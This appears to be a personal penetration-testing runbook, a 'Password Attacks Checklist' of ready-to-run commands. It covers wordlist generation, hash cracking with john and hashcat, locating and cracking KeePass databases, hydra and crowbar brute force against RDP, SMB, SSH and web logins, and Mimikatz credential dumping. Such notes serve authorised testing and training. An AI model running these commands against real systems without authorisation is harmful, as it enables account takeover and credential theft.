# Password Attacks Checklist
<!--- Status 90% --->
<!---Mimikatz how to --->

## Introduction

This runbook provides a guide to help with password attacks. It includes a variety of techniques and tools for trying to generate word list, crack passwords, and dumping passwords or hashes from the operating system.

## Table of Contents

- [Password Attacks Checklist](#password-attacks-checklist)
  - [Introduction](#introduction)
  - [Table of Contents](#table-of-contents)
  - [Generate World list](#generate-world-list)
    - [Rules](#rules)
  - [Cracking Password](#cracking-password)
    - [Identifying Hash Type](#identifying-hash-type)
    - [Hashing different file types for cracking with 2john](#hashing-different-file-types-for-cracking-with-2john)
  - [Brute Force Attacks](#brute-force-attacks)
    - [Password Manager](#password-manager)
    - [Hydra](#hydra)
    - [RDP - Crowbar](#rdp---crowbar)
    - [SMB - Hydra](#smb---hydra)
    - [SSH - Hydra](#ssh---hydra)
    - [HTTP POST Login Form - Hydra](#http-post-login-form---hydra)
    - [HTTP GET Login Form - Hydra](#http-get-login-form---hydra)
  - [Password Dumps](#password-dumps)
    - [Mimikatz usage](#mimikatz-usage)

## Generate World list

Generating wordlist based on information from a website
```
cewl <domain> -w wordlist.txt
```

Using Crunch:
`@ = Lower case alpha characters`  
`, = Upper case alpha characters`  
`% = Numeric characters`  
`^ = Special characters including space`

crunch min-len max-len charset
```
crunch 4 6 0123456789abcdef -o wordlist.txt
```

### Rules

Add the rules you want in the /etc/john/john.conf file inside the rules module [List.Rules:Wordlist] to modify your wordlists  
basic rule example `$@$[1-2]$[0-9]$[0-9]$[0-9]`
```
john --wordlist=wordlist.txt --rules --stdout > mutated.txt
```

## Cracking Password

### Identifying Hash Type

```sh
hashid <hash>
```

### Hashing different file types for cracking with 2john

- [ssh2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/ssh2john.c)  
- [rar2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/rar2john.c)  
- [zip2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/zip2john.c)  
- [keepass2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/keepass2john.c)  
- [office2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/office2john.c)  
- [pdf2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/pdf2john.c)  
- [pwsafe2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/pwsafe2john.c)  
- [racf2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/racf2john.c)  
- [vncpcap2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/vncpcap2john.cpp)  
- [hccap2jjohn](https://github.com/piyushcse29/john-the-ripper/blob/master/src/hccap2john.c)  
- [keychain2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/keychain2john.c)  
- [mozilla2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/mozilla2john.c) 

## Brute Force Attacks

### Password Manager

  Search KeePass database files
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

  Hashing the .kdbx file
```
keepass2john Database.kdbx > keepass.hash   
```

  Finding Hash-Mode ID of hashcat
```
hashcat --help | grep -i "KeePass"
```

  Cracking
```
hashcat -m 13400 keepass.hash
```

### Hydra

```
hydra -L /usr/share/wordlists/rockyou.txt t -p "<password" rdp://<IP>
```

### RDP - Crowbar

```
crowbar -b rdp -s X.X.X.X/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 1
```

### SMB - Hydra

```
hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb
```

### SSH - Hydra

```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

### HTTP POST Login Form - Hydra

```
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f
```

### HTTP GET Login Form - Hydra

```
hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login
```

## Password Dumps

Active Directory Enumeration also has a complete guide, but these are some basics. 
Dump the same
Also look at linux password dumps

### Mimikatz usage

Display logged on users passowrds
```
sekurlsa::logonpasswords
```

 <!--- Last Updated July 8, 2024 But still needs work --->